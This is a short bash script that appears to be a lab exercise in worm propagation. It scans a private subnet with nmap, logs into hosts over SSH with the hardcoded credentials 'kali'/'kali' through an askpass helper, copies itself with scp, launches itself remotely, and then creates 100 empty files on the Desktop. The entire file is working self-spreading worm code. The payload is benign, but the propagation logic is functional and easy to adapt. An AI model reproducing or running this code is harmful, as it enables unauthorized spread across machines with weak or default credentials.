#!/bin/bash

# define the username and password to use to attempt to infect target machines
USER="kali"
PASS="kali"

# define the range of IPs to scan to try to infect
IP_RANGE="192.168.161.129"

# get a list of available IP addresses to attempt to infect
nmap -sn ${IP_RANGE}/28 -oG /tmp/nmap_out
ip_addrs=$(cat /tmp/nmap_out | grep "Status: Up" | awk '{ print $2 }')
rm /tmp/nmap_out

# create a script that automatically inputs password when sshing into a target machine
echo "case \$1 in *word*) echo $PASS;; *) echo yes;; esac" > /tmp/saypass.sh
chmod 775 /tmp/saypass.sh


while read addr; do
	echo "attempting to infect: ${addr}"

	# check if we have already infected this machine
	dir_content=$(SSH_ASKPASS="/tmp/saypass.sh" DISPLAY=anything setsid ssh -n ${USER}@${addr} "ls $0" 2>/tmp/ssh_err)

	# if we don't encounter an error when trying to ssh and the file doesn't exist already, infect the machine
	if [[ "$dir_content" = "" && $(cat /tmp/ssh_err) = *"No such file"* ]]; then

		# copy the worm to the target machine and run it
		SSH_ASKPASS="/tmp/saypass.sh" DISPLAY=anything setsid scp ./$0 ${USER}@${addr}:. 2>/tmp/ssh_err
		SSH_ASKPASS="/tmp/saypass.sh" DISPLAY=anything setsid ssh -n ${USER}@${addr} "nohup $0 >/dev/null 2>&1 </dev/null &" 2>>/tmp/ssh_err

		if [[ $(cat /tmp/ssh_err) = "" ]]; then
			echo "successfully infected: ${addr}"
		else
			echo "failed to infect: ${addr}"
		fi

	else
		echo "skipping: ${addr}"
	fi

	rm /tmp/ssh_err
done <<< "$ip_addrs"

rm /tmp/saypass.sh


# deploy payload (putting 100 empty files on the Desktop)
if [[ $(whoami) = "kali" ]]; then
	i=0
	while [ $i -lt 100 ]; do 
		touch ~/Desktop/GLØWŸRM_$$_$i.txt 2>/dev/null
		sleep 0.1
		((i++))
	done
fi
